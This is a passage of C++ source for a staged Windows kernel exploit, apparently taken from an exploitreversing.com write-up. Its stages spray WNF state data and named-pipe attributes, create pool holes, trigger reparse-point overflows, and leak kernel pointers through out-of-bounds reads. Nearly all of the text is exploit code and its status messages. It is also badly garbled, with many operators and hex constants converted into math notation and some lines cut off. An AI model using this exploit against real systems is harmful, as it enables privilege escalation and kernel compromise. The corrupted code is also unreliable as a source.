|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
\
printf("\[+\] Saved reserve handle: 0x%p\\n", g\_saved\_reserve\_handle);\
\
printf("\[+\] Waiting for the memory to stabilize...\\n");\
\
Sleep(SLEEP\_LONG);\
\
printf("\[+\] Stage 07 COMPLETE\\n");\
\
return TRUE;\
\
}\
\
//=\
\
// STAGE 08: LEAK KERNEL POINTER\
\
//=\
\
static BOOL Stage08\_LeakKernelPointer(void) { printf("\\n== =\\n"); printf(" STAGE 08: LEAK KERNEL POINTER\\n"); printf("= =\\n"); g\_victim\_index = -1; for (DWORD i = 1; i $\\angle$ WNF\_SPRAY\_COUNT; i $+ = ~ 2$ ) { if (!g\_wnf\_active\[i\]) continue; ULONG bufferSize $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; WNF\_CHANGE\_STAMP changeStamp $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; NTSTATUS status $=$ g\_NtQueryWnfStateData(&g\_wnf\_names\[i\], NULL, NULL,\
\
&changeStamp, NULL, &bufferSize); if ((status $= =$ STATUS\_BUFFER\_TOO\_SMALL \|\| status $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) && changeStamp $= =$\
\
CHANGE\_STAMP\_FIRST) { g\_victim\_index = i; printf("\[+\] Found victim WNF at index %d (DataSize: 0x%lX)\\n", i,\
\
bufferSize); break; } } if (g\_victim\_index $\\begin{array} { r l } { = { } } & { { } - 1 } \\end{array}$ ) { printf("\[-\] No corrupted WNF found\\n"); return FALSE; } ULONG querySize $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; WNF\_CHANGE\_STAMP stamp $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; g\_NtQueryWnfStateData(&g\_wnf\_names\[g\_victim\_index\], NULL, NULL, &stamp, NULL,\
\
&querySize); auto buffer $=$ std::make\_unique<BYTE\[\] $>$ (querySize + $\\Theta \\times \\bot \\Theta$ ); ULONG readSize $=$ querySize; g\_NtQueryWnfStateData(&g\_wnf\_names\[g\_victim\_index\], NULL, NULL, &stamp,\
\
buffer.get(), &readSize); if (readSize $>$ $\\Theta \\times$ FF0) { ULONG64 value $=$ \*(ULONG64\*)(buffer.get() + 0xFF0); if (IsKernelPointer(value)) { g\_leaked\_kalpc $=$ (PVOID)value; printf("\[+\] KERNEL POINTER LEAKED: 0x%p\\n", g\_leaked\_kalpc); printf("\[+\] Stage 08 COMPLETE\\n"); return TRUE; } printf("\[-\] No kernel pointer found\\n"); return FALSE;\
\
}\
\
//=\
\
// STAGE 09: CREATE PIPES\
\
//=\
\
static BOOL Stage09\_CreatePipes(void) { printf $( " ) \\setminus \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg$ printf(" STAGE 09: CREATE PIPES\\n"); printf ${ \\bf \\Pi } " \\subseteq \\Vert \\mathbf { \\Omega } " \\Vert = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\cap \\Pi ^ { \\prime } \\bot \\cup \\cup \\dotsc = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\frac = = = = = = = = = = = = = = = = = = = = \\frac = = = \\frac = =$ ; g\_pipe\_read $=$ std::make\_unique<HANDLE\[\] $>$ (PIPE\_SPRAY\_COUNT); g\_pipe\_write $=$ std::make\_unique<HANDLE\[\] $>$ (PIPE\_SPRAY\_COUNT); DWORD created $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ PIPE\_SPRAY\_COUNT; $\\dot { 7 } + +$ ) { if (CreatePipe(&g\_pipe\_read\[i\], &g\_pipe\_write\[i\], NULL, $\\Theta \\times 1 \\Theta \\Theta \\Theta$ )) created++; else g\_pipe\_read\[i\] $=$ g\_pipe\_write\[i\] $=$ NULL; } printf("\[+\] Created %lu pipe pairs\\n", created); printf("\[+\] Waiting for the memory to stabilize...\\n"); Sleep(SLEEP\_NORMAL); printf("\[+\] Stage 09 COMPLETE\\n"); return TRUE;\
\
}\
\
//===\
\
// STAGE 10: SPRAY PIPE ATTRIBUTES (CLAIM)\
\
//=\
\
static BOOL Stage10\_SprayPipeAttributesClaim(void) { printf printf(" ${ \\mathrm { ~ ~ \\gamma ~ } } \_ { \\mathrm { ~ M ~ } } ^ { n } \\setminus { \\mathrm { ~ ~ \\gamma ~ } \_ { \\mathrm { ~ M ~ } } ^ { n } = \\mathrm { ~ ~ \\gamma ~ } \_ { \\mathrm { ~ C ~ } } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\setminus \\mathrm { ~ ~ \\gamma ~ } \_ { \\mathrm { ~ M ~ } } ^ { n } \\setminus { \\mathrm { ~ ~ ~ \\gamma ~ } \_ { \\mathrm { ~ M ~ } } ^ { n } } .$ STAGE 10: SPRAY PIPE ATTRS (CLAIM)\\n"); ; printf( ${ \\mathrm { ~ \\iota " } } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\cap \\mathrm { ~ \\iota " ~ }$ ===\\n"); char array\_data\_pipe $\[ ( 0 \\times 1 0 0 0 ) \] = \[ ( 0 ) \]$ ; memset(array\_data\_pipe, $\\Theta \\times 5 4$ , $\\Theta \\times 2 \\Theta$ ); memset(array\_data\_pipe $^ +$ $\\Theta \\times 2 1$ , $\\Theta \\times 5 4$ , $\\Theta \\times 4 \\Theta$ ); DWORD attrSet $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ PIPE\_SPRAY\_COUNT; $\\dot { 7 } + +$ ) { if (g\_pipe\_write\[i\] $= =$ NULL) continue; IO\_STATUS\_BLOCK iosb $=$ {}; if (g\_NtFsControlFile(g\_pipe\_write\[i\], NULL, NULL, NULL, &iosb, FSCTL\_PIPE\_SET\_PIPE\_ATTRIBUTE, array\_data\_pipe, PIPE\_ATTR\_CLAIM\_SIZE, NUL\
\
0) == 0) attrSet++; printf("\[+\] Set %lu pipe attributes\\n", attrSet);\
\
printf("\[+\] Waiting for the memory to stabilize...\\n");\
\
Sleep(SLEEP\_NORMAL);\
\
printf("\[+\] Stage 10 COMPLETE\\n");\
\
return TRUE;\
\
}\
\
//=\
\
// STAGE 11: SECOND WNF SPRAY\
\
//==\
\
static BOOL Stage11\_SecondWnfSpray(void) { printf("\\n=============== =====\\n"); printf(" STAGE 11: SECOND WNF SPRAY\\n"); printf ${ \\bf \\Pi } ^ { " 1 } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\left. \\Pi ^ { 1 } ^ { 1 } \\right. = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } .$ g\_wnf\_pad\_names\_second $=$\
\
std::make\_unique<WNF\_STATE\_NAME\[\] $>$ (WNF\_PAD\_SPRAY\_COUNT\_SECOND); g\_wnf\_names\_second $=$ std::make\_unique<WNF\_STATE\_NAME\[\]>(WNF\_SPRAY\_COUNT\_SECOND); g\_wnf\_active\_second $=$ std::make\_unique<BOOL\[\] $>$ (WNF\_SPRAY\_COUNT\_SECOND); memset(g\_wnf\_active\_second.get(), 0, WNF\_SPRAY\_COUNT\_SECOND $\\star$ sizeof(BOOL)); PSECURITY\_DESCRIPTOR pSecurityDescriptor $=$ nullptr; ConvertStringSecurityDescriptorToSecurityDescriptorW(L"", SDDL\_REVISION\_1,\
\
&pSecurityDescriptor, nullptr); auto wnf\_data $=$ std::make\_unique<BYTE\[\] $>$ (WNF\_DATA\_SIZE); memset(wnf\_data.get(), $\\Theta \\times 5 2$ , WNF\_DATA\_SIZE); for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ WNF\_PAD\_SPRAY\_COUNT\_SECOND; i++) { g\_NtCreateWnfStateName(&g\_wnf\_pad\_names\_second\[i\], WnfTemporaryStateName,\
\
WnfDataScopeUser, FALSE, NULL, $\\Theta \\times 1 \\Theta \\Theta \\Theta$ , pSecurityDescriptor); } for (DWORD i = 0; i $\\angle$ WNF\_SPRAY\_COUNT\_SECOND; i++) { g\_NtCreateWnfStateName(&g\_wnf\_names\_second\[i\], WnfTemporaryStateName,\
\
WnfDataScopeUser, FALSE, NULL, $\\Theta \\times 1 \\Theta \\Theta \\Theta$ , pSecurityDescriptor); } for (DWORD ${ \\begin{array} { r l r l } { \\mathbf { \\dot { \\tau } } \_ { } } & { = } & { \\mathbf { \\nabla } \\Theta } \\end{array} }$ ; i $\\angle$ WNF\_PAD\_SPRAY\_COUNT\_SECOND; i++) { g\_NtUpdateWnfStateData(&g\_wnf\_pad\_names\_second\[i\], wnf\_data.get(),\
\
WNF\_DATA\_SIZE, NULL, NULL, 0, 0); } Sleep(SLEEP\_NORMAL); DWORD updated $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ WNF\_SPRAY\_COUNT\_SECOND; $\\dot { 7 } + +$ ) { if (g\_NtUpdateWnfStateData(&g\_wnf\_names\_second\[i\], wnf\_data.get(),\
\
WNF\_DATA\_SIZE, NULL, NULL, 0, 0) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) { g\_wnf\_active\_second\[i\] $=$ TRUE; updated++; } }\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
LocalFree(pSecurityDescriptor);\
\
printf("\[+\] Created and updated %lu second wave WNF\\n", updated);\
\
printf("\[+\] Waiting for the memory to stabilize...\\n");\
\
Sleep(SLEEP\_NORMAL);\
\
printf("\[+\] Stage 11 COMPLETE\\n");\
\
return TRUE;\
\
// STAGE 12: CREATE HOLES (SECOND)\
\
static BOOL Stage12\_CreateHolesSecond(void) { printf("\\n========= =====\\n"); printf(" STAGE 12: CREATE HOLES (SECOND)\\n"); printf ${ \\bf \\Pi } ^ { " 1 } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\left. \\Pi ^ { 1 } ^ { 1 } \\right. = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } = \\frac { 1 } { \\sqrt { 1 + ( \\frac { d } { d } ) ^ { 2 } } } .$\
\
DWORD deleted $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
for (DWORD i $=$ 0; i $\\angle$ WNF\_SPRAY\_COUNT\_SECOND; i $+ = ~ 2$ ) { if (g\_wnf\_active\_second\[i\]) { if (g\_NtDeleteWnfStateName(&g\_wnf\_names\_second\[i\]) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) { g\_wnf\_active\_second\[i\] $=$ FALSE; deleted $^ { + + }$ ; } }\
\
} printf("\[+\] Created %lu holes\\n", deleted);\
\
printf("\[+\] Waiting for the memory to stabilize...\\n");\
\
Sleep(SLEEP\_NORMAL);\
\
printf(" $\[ + \]$ Stage 12 COMPLETE\\n");\
\
return TRUE;\
\
//==\
\
// STAGE 13: PLACE SECOND OVERFLOW\
\
//==\
\
static BOOL Stage13\_PlaceSecondOverflow(void) { printf("\\n======== =====\\n"); printf(" STAGE 13: PLACE SECOND OVERFLOW\\n"); printf ${ \\binom { 1 1 } { 1 } } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = $ ;\
\
SetFileAttributesW(g\_filePath\_second, FILE\_ATTRIBUTE\_NORMAL);\
\
DeleteFileW(g\_filePath\_second);\
\
HANDLE hFile $=$ CreateFileW(g\_filePath\_second, GENERIC\_ALL, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE, NULL, CREATE\_NEW, FILE\_ATTRIBUTE\_NORMAL, NULL);\
\
if (hFile $= =$ INVALID\_HANDLE\_VALUE) { printf("\[-\] Failed to create second file: %lu\\n", GetLastError()) return FALSE;\
\
}\
\
std::unique\_ptr<char\[\]> payload(new char\[REPARSE\_DATA\_SIZE\]);\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
memset(payload.get(), PAYLOAD\_FILL\_BYTE, $\\Theta \\times 1 \\Theta \\Theta \\Theta$ );\
\
memset(payload.get() $^ +$ $\\Theta \\times 1 \\Theta \\Theta \\Theta$ , 0, REPARSE\_DATA\_SIZE - $\\Theta \\times 1 \\Theta \\Theta \\Theta$ );\
\
\*(ULONG\*)(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta \\Theta$ ) $=$ $\\Theta \\times \\odot \\odot \\odot \\odot \\odot \\odot 4$ ; $\\star ( { \\sf U L O N G } \\star )$ )(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ 0x04) = $\\Theta \\times \\odot \\odot \\odot \\odot \\mathsf { F } \\mathsf { F } \\otimes$ ; $\\star ( { \\sf U L O N G } \\star )$ )(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta \ 8 $ ) = $\\Theta \\times \\odot \\odot \\odot \\odot \\mathsf { F } \\mathsf { F } \\otimes$ ; $\\star ( { \\sf U L O N G } \\star )$ )(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ) $=$ CHANGE\_STAMP\_SECON\
\
int rc $=$ BuildAndSetReparsePoint(hFile, PAYLOAD\_SIZE\_OVERFLOW, payload.get());\
\
CloseHandle(hFile);\
\
if ( ${ \\mathsf { r c } } \\quad ! = \\quad \\odot ,$ ) { printf("\[-\] Failed to set reparse point\\n"); return FALSE;\
\
} printf("\[+\] Reparse point set (ChangeStamp $=$ 0x%04X)\\n", CHANGE\_STAMP\_SECOND);\
\
printf("\[+\] Stage 13 COMPLETE\\n");\
\
return TRUE;\
\
// STAGE 14: TRIGGER SECOND OVERFLOW static BOOL Stage14\_TriggerSecondOverflow(void) { printf("\\n========= $( " ) \\setminus \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg \\neg$ printf(" STAGE 14: TRIGGER SECOND OVERFLOW\\n"); printf ${ \\bf \\check { \\Psi } } ^ { \\prime 1 1 } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \\left. \\Pi ^ { \\prime 1 1 } \\right. = \\frac { \\partial \\Pi } { \\partial \\Pi } = \\frac { \\partial \\Pi } { \\partial \\Pi } = \\frac { \\partial \\Pi } { \\partial \\Pi } = \\frac { \\partial \\Pi } { \\partial \\Pi } = \\frac { \\partial \\Pi } { \\partial \\Pi } = \\frac { \\partial \\Pi } { \\partial \\Pi } = \\frac { \\partial \\Pi } { \\partial \\Pi } = \\frac { \\partial } { \\partial \\Pi } = = = = = = = \\left. \\Pi { \\bf \\Psi } \\right. .$ ;\
\
HANDLE hFile $=$ CreateFileW(g\_filePath\_second, GENERIC\_READ, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE, NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL);\
\
if (hFile $= =$ INVALID\_HANDLE\_VALUE) { printf("\[-\] Failed to open second file: %lu\\n", GetLastError()) return FALSE;\
\
} CloseHandle(hFile);\
\
printf("\[+\] Second overflow triggered\\n");\
\
printf("\[+\] Waiting for the memory to stabilize...\\n");\
\
Sleep(SLEEP\_SHORT);\
\
printf("\[+\] Stage 14 COMPLETE\\n");\
\
return TRUE;\
\
}\
\
// STAGE 15: FILL WITH PIPE ATTRIBUTES static BOOL Stage15\_FillWithPipeAttributes(void) { printf ${ } ^ { 1 1 } \\setminus \\bigcup \\neg = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\setminus \\cap ^ { 1 1 } .$ ; printf(" STAGE 15: FILL WITH PIPE ATTRS\\n"); printf("====== ${ \\binom { 1 1 } { 1 } } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\cap { \\binom { 1 1 } { 1 1 } }$ ;\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
char array\_data\_pipe $\[ ( { \\mit \\odot } \\times \\mathrm { \\underline { { { 1 } } } } \\odot \\odot \\mit \\Theta \] = \\left{ \\begin{array} { c c } { { \\mathrm { \\scriptsize { \\odot } } } } \\end{array} \\right}$ ;\
\
memset(array\_data\_pipe, $\\Theta \\times 5 5$ , $\\Theta \\times 2 \\Theta$ );\
\
memset(array\_data\_pipe $^ +$ $\\Theta \\times 2 1$ , $\\Theta \\times 5 5$ , $\\Theta \\times 4 \\Theta$ ); if (g\_pipe\_write\[i\] $= =$ NULL) continue; IO\_STATUS\_BLOCK iosb $= { }$ ; if (g\_NtFsControlFile(g\_pipe\_write\[i\], NULL, NULL, NULL, &iosb, FSCTL\_PIPE\_SET\_PIPE\_ATTRIBUTE, array\_data\_pipe, PIPE\_ATTR\_FILL\_SIZE, NUL\
\
$\\begin{array} { r l r } { \\Theta ) } & { { } = = } & { \\Theta } \\end{array}$ attrSet++; } printf("\[+\] Set %lu large pipe attributes\\n", attrSet); printf("\[+\] Waiting for the memory to stabilize...\\n"); Sleep(SLEEP\_LONG $^ +$ 3000); printf("\[+\] Stage 15 COMPLETE\\n"); return TRUE;\
\
}\
\
//==\
\
// STAGE 16: FIND SECOND VICTIM AND LEAK PIPE\
\
//==\
\
static BOOL Stage16\_FindSecondVictimAndLeakPipe(void) { printf ${ \\mathrm { ~ \\mathcal { C } ~ } } ^ { \\mathrm { ~ n ~ } } \\setminus \\neg = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\setminus \\cap { \\mathrm { ~ n } } ^ { \\mathrm { ~ n ~ } } \\cup { \\mathrm { ~ 1 ~ } } \\cup { \\mathrm { ~ 1 ~ } }$ ; printf(" STAGE 16: FIND VICTIM & LEAK PIPE\\n"); printf("= ${ \\bf \\Pi } ^ { " 1 } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\Pi ^ { " 1 } \\cup \\approx = = = = = = = = = = = = = = = = = \\left. \\Pi ^ { " 1 } \\right. .$ ; g\_victim\_index\_second $= ~ - 1$ ; g\_leaked\_pipe\_attr $=$ NULL; for (DWORD i $= ~ 1$ ; i $\\angle$ WNF\_SPRAY\_COUNT\_SECOND; i $+ = ~ 2$ ) { if (!g\_wnf\_active\_second\[i\]) continue; ULONG bufferSize $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; WNF\_CHANGE\_STAMP changeStamp $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; NTSTATUS status $=$ g\_NtQueryWnfStateData(&g\_wnf\_names\_second\[i\], NULL, NULL,\
\
&changeStamp, NULL, &bufferSize); if ((status $= =$ STATUS\_BUFFER\_TOO\_SMALL \|\| status $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) && changeStamp $= =$\
\
CHANGE\_STAMP\_SECOND) { g\_victim\_index\_second $= \\dot { ~ } \\dot { ~ } \\dot { ~ }$ ; printf("\[+\] Found second victim WNF at index %d\\n", i); if (bufferSize > $=$ $\\Theta \\times$ FF8) { auto buffer $=$ std::make\_unique<BYTE\[\] $>$ (bufferSize + $\\Theta \\times \\bot \\Theta$ ); ULONG readSize $=$ bufferSize; g\_NtQueryWnfStateData(&g\_wnf\_names\_second\[i\], NULL, NULL, &changeSta\
\
buffer.get(), &readSize); if (readSize $> =$ 0xFF8) { ULONG64 oob\_value $=$ \*(ULONG64\*)(buffer.get() + 0xFF0); if (IsKernelPointer(oob\_value)) { g\_leaked\_pipe\_attr $=$ (PVOID)oob\_value; printf("\[+\] PIPE\_ATTRIBUTE LEAKED: 0x%p\\n",\
\
g\_leaked\_pipe\_attr); } } } break; } } if (g\_victim\_index\_second $\\begin{array} { r l } { = { } } & { { } - 1 } \\end{array}$ ) { printf("\[-\] No corrupted WNF found (second wave)\\n"); return FALSE; } printf("\[+\] Stage 16 COMPLETE\\n"); return TRUE;\
